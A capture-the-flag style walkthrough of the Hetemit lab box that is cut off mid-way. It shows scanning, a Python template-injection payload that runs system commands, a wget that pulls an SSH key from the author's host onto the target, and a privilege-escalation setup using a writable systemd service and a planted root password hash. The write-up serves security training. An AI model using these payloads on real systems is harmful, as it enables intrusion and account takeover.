---
title: Hetemit - Proving Grounds
published: true
---

![](assets/img/hetemit-pg/icon.jpg)

**Hey guys,** today we are going to pwn **Hetemit** from [Proving Grounds](https://portal.offensive-security.com/proving-grounds/practice).

**Hetemit** is an intermediate level linux box. 
Before we begin, a brief overview of what exactly we are going to do :
* We get into the system by exploiting a SSTI vunerability at an API endpoint.
* Then we escalate our privileges by exploiting a misconfigured systemd service on the system.

With that said, let us begin.

![](assets/img/hetemit-pg/meme1.gif)

## SCANNING :

```
┌──(root💀nehal)-[~]
└─# nmap -p- -T4 -sC -sV 192.168.131.117
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-01 04:20 IST
Nmap scan report for 192.168.131.117
Host is up (0.35s latency).
Not shown: 65528 filtered ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
18000/tcp open  biimenu?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port18000-TCP:V=7.91%I=7%D=6/1%Time=60B56997%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReques
SF:t,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x20
SF:charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html>\n<ht
SF:ml\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n\
SF:x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title>\n\x2
SF:0\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20backgr
SF:ound-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20\
SF:x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x
SF:20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-fa
SF:mily:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x20\x20\
SF:x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-he
SF:ight:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x20
SF:\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white-spac
SF:e:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\x
SF:20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x2
SF:0\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x
SF:20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\x
SF:20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x20
SF:\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20paddin
SF:g:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{\n
SF:\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20\x20\x
SF:20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x202em;\n
SF:\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x20\x20c
SF:olor:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\n\x20\
SF:x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\x20\x2
SF:0bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Typ
SF:e:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!D
SF:OCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charse
SF:t=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x2
SF:0caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x
SF:20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20co
SF:lor:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x2
SF:0}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x2
SF:0\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-s
SF:erif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x2
SF:0\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x
SF:20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x
SF:20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#E
SF:EE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x2
SF:0margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x2
SF:0\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x
SF:20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x
SF:20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\
SF:x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x
SF:20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20
SF:font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\
SF:x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-hei
SF:ght:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x2
SF:0\x20\x20\x20\x20\x20bord");
Service Info: OS: Unix

Host script results:
|_clock-skew: -5h30m01s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-31T17:26:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 427.74 seconds
```

We have FTP service (VsFTPd 3.0.3) on port 21, SSH service (OpenSSH 8.0) on port 22, SMB and NetBIOS service (Samba smbd 4.6.2) on ports 139 and 445, and web service on port 80 (Apache 2.4.37), 18000 (Unknown version of service) and 50000 (Werkzeug 1.0.1 / Python 3.6.8).

## ENUMERATING FTP :

From the NMAP scan, we know anonymous login on FTP is enabled. 

```
┌──(root💀nehal)-[~]
└─# ftp 192.168.131.117
Connected to 192.168.131.117.
220 (vsFTPd 3.0.3)
Name (192.168.131.117:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
200 PORT command successful. Consider using PASV.
425 Failed to establish connection.
ftp> 
```

We are successfully connected as `anonymous`. But whenever we try to list the directory contents, we get a connection timeout. So there is not much we can do with it right now.
Let us move to other services.

## ENUMERATING SMB :

First, let us see what shares we have with null authentication.

```
┌──(root💀nehal)-[~]
└─# smbclient -L //192.168.131.117/ -U ''
Enter WORKGROUP\'s password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

We can not access the shares with null authentication.

```
┌──(root💀nehal)-[~]
└─# smbclient -L //192.168.131.117/
Enter WORKGROUP\root's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Cmeeks          Disk      cmeeks Files
        IPC$            IPC       IPC Service (Samba 4.11.2)
SMB1 disabled -- no workgroup available
```

However, when we do not specify any username, we can see a share called `cmeeks`. This might be a user on the system. So, we will take a note of this.

Now let us connect to it.

```
┌──(root💀nehal)-[~]
└─# smbclient //192.168.131.117/cmeeks
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 
```

The same thing again : we can not list the share contents. So we need to move to other services since we can not do much without listing.

## ENUMERATING WEB SERVICES :

When we visit the website on port 80, we are greeted with :

![](assets/img/hetemit-pg/80-home.png)

This seems to be the default webpage for **Apache** server. So, nothing interesting here.

Let us see what port 18000 has for us.

![](assets/img/hetemit-pg/18000-home.png)

We see something called **Protomba**. I do not really know what that is. However, we can see two links to `login` and `register`.

![](assets/img/hetemit-pg/18000-register.png)

The link to `register` takes us to `/users/new`. For registering a user, we need to provide an email, username, password, invite code and a profile picture.

But we do not have an invite code right now. So we can not register at this moment.

![](assets/img/hetemit-pg/18000-login.png)

At the `/login` page, we can try some common credentials like :

```
admin:admin
admin:password
admin:root
admin:hetemit
```

But none of them worked. So let us now move to port 50000.

![](assets/img/hetemit-pg/50000-home.png)

Well, it seems to be the API for invite code generation that we saw in the port 18000 webpage.

![](assets/img/hetemit-pg/18000-generate.png)

When we go to `/generate`, the server replies with `{'email@domain'}`. Maybe we need to supply a parameter to specify the email.

Let us fire burpsuite and play with it a bit.

```
GET /generate?email=nehal@pwnersec.hacks HTTP/1.1
Host: 192.168.131.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=gqUOmpxCTU%2BZ8b3oNACheXFmUuJX5N%2BWP%2BltT7KqntFHRcaBiHIdpYT84HCMXtBbB2tEzSBuSwDNOVOiBgKWAXrpnupVMphsBisMAEmSy6PoJJEBT481LPgBwLRcXYKMAaupFmSAqz51CeXRRO%2BbHdFp6btM4qOphJFtQeLBGysqOGoqnepboD%2FOIvmpYHQyLcugpErPetzeIf4OPasMFDgoBD8SRzh0LEm8R4kmF85f53BQqTaW%2F2ibFktj%2Fop4s2aPRDlJC2vyEH%2ByICuGv95jHPfbOVn2h3ceEuZSph3I--%2F8n08ek6wERCk2TG--iW5SiN97ItbFtShjuIHroQ%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

-----------------------------------------------------------------------------------------------------------------------------------------

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 16
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Mon, 31 May 2021 18:04:25 GMT

{'email@domain'}
```

When we used GET method to supply the parameter as email, we get the same response as before.

```
POST /generate HTTP/1.1
Host: 192.168.131.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=gqUOmpxCTU%2BZ8b3oNACheXFmUuJX5N%2BWP%2BltT7KqntFHRcaBiHIdpYT84HCMXtBbB2tEzSBuSwDNOVOiBgKWAXrpnupVMphsBisMAEmSy6PoJJEBT481LPgBwLRcXYKMAaupFmSAqz51CeXRRO%2BbHdFp6btM4qOphJFtQeLBGysqOGoqnepboD%2FOIvmpYHQyLcugpErPetzeIf4OPasMFDgoBD8SRzh0LEm8R4kmF85f53BQqTaW%2F2ibFktj%2Fop4s2aPRDlJC2vyEH%2ByICuGv95jHPfbOVn2h3ceEuZSph3I--%2F8n08ek6wERCk2TG--iW5SiN97ItbFtShjuIHroQ%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

email=nehal@pwnersec.hacks

-----------------------------------------------------------------------------------------------------------------------------------------

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 64
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Mon, 31 May 2021 18:05:58 GMT

a50b1f8e2bf97c52cf87403613021e788f401aa94568e25527ada991ad96324a
```

But when we used POST method, we definitely get the invite code. 

Now we can register to `Protomba` with this code. But we have another end-point `/verify` apart from `/generate`. Let us see what that is.

```
GET /verify HTTP/1.1
Host: 192.168.131.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=gqUOmpxCTU%2BZ8b3oNACheXFmUuJX5N%2BWP%2BltT7KqntFHRcaBiHIdpYT84HCMXtBbB2tEzSBuSwDNOVOiBgKWAXrpnupVMphsBisMAEmSy6PoJJEBT481LPgBwLRcXYKMAaupFmSAqz51CeXRRO%2BbHdFp6btM4qOphJFtQeLBGysqOGoqnepboD%2FOIvmpYHQyLcugpErPetzeIf4OPasMFDgoBD8SRzh0LEm8R4kmF85f53BQqTaW%2F2ibFktj%2Fop4s2aPRDlJC2vyEH%2ByICuGv95jHPfbOVn2h3ceEuZSph3I--%2F8n08ek6wERCk2TG--iW5SiN97ItbFtShjuIHroQ%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

-----------------------------------------------------------------------------------------------------------------------------------------

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 8
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Mon, 31 May 2021 18:08:45 GMT

{'code'}
```

A simple GET request to `/verify` reveals that we need to give a paramter `code`.

```
GET /verify?code=123456789 HTTP/1.1
Host: 192.168.131.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=gqUOmpxCTU%2BZ8b3oNACheXFmUuJX5N%2BWP%2BltT7KqntFHRcaBiHIdpYT84HCMXtBbB2tEzSBuSwDNOVOiBgKWAXrpnupVMphsBisMAEmSy6PoJJEBT481LPgBwLRcXYKMAaupFmSAqz51CeXRRO%2BbHdFp6btM4qOphJFtQeLBGysqOGoqnepboD%2FOIvmpYHQyLcugpErPetzeIf4OPasMFDgoBD8SRzh0LEm8R4kmF85f53BQqTaW%2F2ibFktj%2Fop4s2aPRDlJC2vyEH%2ByICuGv95jHPfbOVn2h3ceEuZSph3I--%2F8n08ek6wERCk2TG--iW5SiN97ItbFtShjuIHroQ%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

-----------------------------------------------------------------------------------------------------------------------------------------

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 8
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Mon, 31 May 2021 18:10:05 GMT

{'code'}
```

When we specify the `code` parameter in GET request, we see the same response as before.

```
POST /verify HTTP/1.1
Host: 192.168.131.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=gqUOmpxCTU%2BZ8b3oNACheXFmUuJX5N%2BWP%2BltT7KqntFHRcaBiHIdpYT84HCMXtBbB2tEzSBuSwDNOVOiBgKWAXrpnupVMphsBisMAEmSy6PoJJEBT481LPgBwLRcXYKMAaupFmSAqz51CeXRRO%2BbHdFp6btM4qOphJFtQeLBGysqOGoqnepboD%2FOIvmpYHQyLcugpErPetzeIf4OPasMFDgoBD8SRzh0LEm8R4kmF85f53BQqTaW%2F2ibFktj%2Fop4s2aPRDlJC2vyEH%2ByICuGv95jHPfbOVn2h3ceEuZSph3I--%2F8n08ek6wERCk2TG--iW5SiN97ItbFtShjuIHroQ%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

code=123456789

-----------------------------------------------------------------------------------------------------------------------------------------

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 9
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Mon, 31 May 2021 18:11:23 GMT

123456789
```

But when we use POST request, we get the code echoed back to us. 
Now, this is interesting cause when we see the same input replied back to us as output, we can try different injection vulnerabilities such as SQLi, command injection, SSTi etc. 

```
POST /verify HTTP/1.1
Host: 192.168.131.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=gqUOmpxCTU%2BZ8b3oNACheXFmUuJX5N%2BWP%2BltT7KqntFHRcaBiHIdpYT84HCMXtBbB2tEzSBuSwDNOVOiBgKWAXrpnupVMphsBisMAEmSy6PoJJEBT481LPgBwLRcXYKMAaupFmSAqz51CeXRRO%2BbHdFp6btM4qOphJFtQeLBGysqOGoqnepboD%2FOIvmpYHQyLcugpErPetzeIf4OPasMFDgoBD8SRzh0LEm8R4kmF85f53BQqTaW%2F2ibFktj%2Fop4s2aPRDlJC2vyEH%2ByICuGv95jHPfbOVn2h3ceEuZSph3I--%2F8n08ek6wERCk2TG--iW5SiN97ItbFtShjuIHroQ%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

code={7*7}

-----------------------------------------------------------------------------------------------------------------------------------------

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 4
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Mon, 31 May 2021 18:14:49 GMT

{49}
```

 When we give `code` parameter value as `{7*7}`, we can see that the output comes to be `{49}`. This can be a potential indication of **Server Side Template Injection (SSTI)**.  Let us dig deep into it now.

The server is **Werkzeug 1.0.1**. It is a python based server (python 3.6.8). Let us see if we can inject arbitrary python code in the `code` parameter.

```
POST /verify HTTP/1.1
Host: 192.168.131.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=gqUOmpxCTU%2BZ8b3oNACheXFmUuJX5N%2BWP%2BltT7KqntFHRcaBiHIdpYT84HCMXtBbB2tEzSBuSwDNOVOiBgKWAXrpnupVMphsBisMAEmSy6PoJJEBT481LPgBwLRcXYKMAaupFmSAqz51CeXRRO%2BbHdFp6btM4qOphJFtQeLBGysqOGoqnepboD%2FOIvmpYHQyLcugpErPetzeIf4OPasMFDgoBD8SRzh0LEm8R4kmF85f53BQqTaW%2F2ibFktj%2Fop4s2aPRDlJC2vyEH%2ByICuGv95jHPfbOVn2h3ceEuZSph3I--%2F8n08ek6wERCk2TG--iW5SiN97ItbFtShjuIHroQ%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

code={os.popen("id").read()}

-----------------------------------------------------------------------------------------------------------------------------------------

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 59
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Mon, 31 May 2021 18:21:30 GMT

{'uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)\n'}
```

We have used python's `os` module here. The `popen` method of `os` module can be used to run system commands on the server. In this case, we have used `id` command. We can see the output of `id` command in the response. So, we achieved **Remote Code Execution (RCE)**.


## EXPLOITATION :

I have tried to get reverse shell connection since we have command execution here. But it seems there is an outgoing traffic filtering present on the server.

We have SSH open. So we can try to inject our SSH public key and get into the box as `cmeeks`.

```
POST /verify HTTP/1.1
Host: 192.168.131.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=gqUOmpxCTU%2BZ8b3oNACheXFmUuJX5N%2BWP%2BltT7KqntFHRcaBiHIdpYT84HCMXtBbB2tEzSBuSwDNOVOiBgKWAXrpnupVMphsBisMAEmSy6PoJJEBT481LPgBwLRcXYKMAaupFmSAqz51CeXRRO%2BbHdFp6btM4qOphJFtQeLBGysqOGoqnepboD%2FOIvmpYHQyLcugpErPetzeIf4OPasMFDgoBD8SRzh0LEm8R4kmF85f53BQqTaW%2F2ibFktj%2Fop4s2aPRDlJC2vyEH%2ByICuGv95jHPfbOVn2h3ceEuZSph3I--%2F8n08ek6wERCk2TG--iW5SiN97ItbFtShjuIHroQ%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 105

code={os.popen("wget http://192.168.49.131/authorized_keys -O /home/cmeeks/.ssh/authorized_keys").read()}
```

```
┌──(root💀nehal)-[~]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.131.117 - - [01/Jun/2021 05:30:10] "GET /authorized_keys HTTP/1.1" 200 -
```

We have successfully transferred our key. Now it is time to make an entry.

```
┌──(root💀nehal)-[~]
└─# ssh -i id_rsa cmeeks@192.168.131.117
Activate the web console with: systemctl enable --now cockpit.socket

[cmeeks@hetemit ~]$ id && hostname; date
uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)
hetemit
Mon May 31 18:32:16 UTC 2021
[cmeeks@hetemit ~]$ 
```

And we are in. You can now read the user flag.

![](assets/img/hetemit-pg/meme2.gif)

## PRIVILEGE ESCALATION :

```
[cmeeks@hetemit ~]$ sudo -l
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2
    QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```

We see that we can `reboot` the system with requiring the root password.

```
[cmeeks@hetemit ~]$ ls -al /etc/systemd/system
total 16
drwxr-xr-x. 10 root root   4096 Nov 13  2020 .
drwxr-xr-x.  4 root root    150 Jul 21  2020 ..
drwxr-xr-x.  2 root root     55 Nov 13  2020 basic.target.wants
lrwxrwxrwx   1 root root     57 Nov 13  2020 dbus-org.freedesktop.nm-dispatcher.service -> /usr/lib/systemd/system/NetworkManager-dispatcher.service
lrwxrwxrwx.  1 root root     56 Jul 21  2020 dbus-org.freedesktop.resolve1.service -> ../../../usr/lib/systemd/system/systemd-resolved.service
lrwxrwxrwx.  1 root root     41 Nov 13  2020 dbus-org.freedesktop.timedate1.service -> /usr/lib/systemd/system/timedatex.service
lrwxrwxrwx.  1 root root     37 Nov 13  2020 default.target -> /lib/systemd/system/multi-user.target
drwxr-xr-x.  2 root root     32 Nov 13  2020 getty.target.wants
drwxr-xr-x.  2 root root   4096 Nov 13  2020 multi-user.target.wants
drwxr-xr-x   2 root root     48 Nov 13  2020 network-online.target.wants
-rw-rw-r--   1 root cmeeks  302 Nov 13  2020 pythonapp.service
-rw-r--r--   1 root root    337 Nov 13  2020 railsapp.service
drwxr-xr-x.  2 root root     52 Nov 13  2020 sockets.target.wants
drwxr-xr-x.  2 root root    207 Nov 13  2020 sysinit.target.wants
lrwxrwxrwx.  1 root root     39 Nov 13  2020 syslog.service -> /usr/lib/systemd/system/rsyslog.service
lrwxrwxrwx.  1 root root      9 May 11  2019 systemd-timedated.service -> /dev/null
drwxr-xr-x.  2 root root     34 Nov 13  2020 timers.target.wants
drwxr-xr-x.  2 root root     29 Nov 13  2020 vmtoolsd.service.requires
```

Furthermore, if we enumerate more, we can see that we can write to a systemd service called `pythonapp.service`. 

Now we can connect the dots. We can modify the `pythonapp.service` to include any command as root. Then we can `reboot` the system to restart the service as we have `sudo` privileges to do so, as a result, we can run any command as root on the system.

```
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service 
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

The most important parameters here are :
* User : The user that the service will run as.
* Execstart : It specifies the command that will run when the service starts. 

Now we want to get shell as root. There are many ways to do so with systemd services. However, I am going to tamper the `/etc/passwd` file to modify `root` password and eventually get shell.

First let us make a SHA-512 hashed password with `mkpasswd`.

```
┌──(root💀nehal)-[~]
└─# mkpasswd -m sha-512 hacked
$6$x09fyUlDjkjzYlIB$XxEXislz4y27iEFte5IGsnqiP7mxEWLsH/Xfq1m3GwcdHH4X7fllR6mZMi2kQVmF6EazOXEM5EGY9H1S1JhSN1
```

Now let us paste this hash on the password field of `root` on a copied file of `/etc/passwd`.

```
[cmeeks@hetemit ~]$ cat passwd.bak 
root:$6$x09fyUlDjkjzYlIB$XxEXislz4y27iEFte5IGsnqiP7mxEWLsH/Xfq1m3GwcdHH4X7fllR6mZMi2kQVmF6EazOXEM5EGY9H1S1JhSN1:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
